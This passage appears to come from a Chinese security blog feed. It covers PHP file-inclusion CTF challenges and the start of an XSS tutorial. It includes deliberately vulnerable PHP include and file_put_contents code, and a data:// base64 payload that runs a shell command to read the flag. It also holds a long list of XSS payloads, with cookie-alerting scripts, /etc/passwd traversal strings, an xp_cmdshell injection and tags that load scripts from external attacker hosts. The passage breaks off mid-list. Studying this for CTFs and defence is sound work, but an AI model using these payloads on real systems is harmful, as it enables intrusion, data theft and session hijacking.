class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        </p><p><strong>9关</strong>（无法加载）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>10关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​      </p><p><strong>11关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>没有过滤 <code>:</code>，使用 data 。<code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</code></p><p>这是直接 cat fl0g.php 而在执行 ls 的时候失败了，因为不能出现等号和加号，所以构造的一句话木马还是有技巧的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;tac fl*&quot;</span>);</span><br><span class="line">base64后</span><br><span class="line">PD9waHAgc3lzdGVtKCJ0YWMgZmwqIik7</span><br></pre></td></tr></table></figure><p>有许多命令都可以查看文件，不同的命令有不同的优点，可以针对不同的需要分别选择命令以提高效率：<br>  cat   由第一行开始显示内容，并将所有内容输出<br>  tac   从最后一行倒序显示内容，并将所有内容输出<br>  more  根据窗口大小，一页一页的现实文件内容<br>  less  和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>  head  只显示头几行<br>  tail  只显示最后几行<br>  nl    类似于cat -n，显示时输出行号</p><p>​      </p><p><strong>12关</strong></p><p>页面是一个电影视频混剪，无法加载</p><p>​      </p><p><strong>13关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>); </span><br></pre></td></tr></table></figure><p>​      </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文记录对文件上传和文件包含漏洞的练习&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="随记" scheme="https://www.mtrleed.top/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS学习(捎带CSRF/CSRF)</title>
    <link href="https://www.mtrleed.top/post/8/"/>
    <id>https://www.mtrleed.top/post/8/</id>
    <published>2021-08-19T16:00:00.000Z</published>
    <updated>2023-03-01T13:32:57.906Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS-漏洞"><a href="#XSS-漏洞" class="headerlink" title="XSS 漏洞"></a>XSS 漏洞</h2><p><strong>1.简介</strong>：跨站脚本攻击，是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong></p><p><strong>xss 分类：（三类）</strong></p><ul><li>反射型XSS：**&lt;非持久化&gt;** 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</li><li>存储型XSS：**&lt;持久化&gt;** 代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</li><li>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</li></ul><p><strong>常用的payload</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;&quot;()&amp;%<span class="tag">&lt;<span class="name">acx</span>&gt;</span><span class="tag">&lt;<span class="name">ScRiPt</span> &gt;</span>prompt(915149)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">=&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(vulnerable)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">%0a%0a<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(\&quot;Vulnerable\&quot;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>.jsp</span><br><span class="line"> </span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> </span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line"> </span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line"> </span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> </span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> </span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Vulnerable&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">a.jsp/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">a?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&#x27;;exec%20master..xp_cmdshell%20&#x27;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#x27;--&amp;&amp;</span><br><span class="line"> </span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line"> </span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line"> </span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">&quot;<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">java\0script:alert(\</span>&quot;<span class="attr">XSS</span>\&quot;)&gt;</span>&quot;;&#x27; &gt; out</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot; javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">a=<span class="regexp">/XSS/</span>alert(a.source)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">size</span>=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">LAYER</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">layer</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;mocha:[code]&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;livescript:[code]&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">FRAME</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-imag url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span 